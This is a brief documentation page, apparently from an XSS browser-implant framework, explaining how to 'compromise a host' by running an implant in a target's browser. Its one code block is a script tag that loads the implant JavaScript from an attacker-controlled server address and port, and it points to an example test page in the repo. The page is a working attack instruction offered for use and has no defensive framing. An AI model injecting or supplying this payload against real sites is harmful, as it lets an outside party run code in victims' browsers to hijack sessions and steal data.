# Compromising Hosts

To compromise a host, you must execute the implant on the target browser.

This can be done easily using the following HTML tag to include the implant script:

```html
<script src="http://<server_address>:<port>/<implant_id>.js"></script>
```

See an example in the [test.html](https://github.com/c0nf1den71al/wagyu-xss/blob/main/test.html) file within the repo.
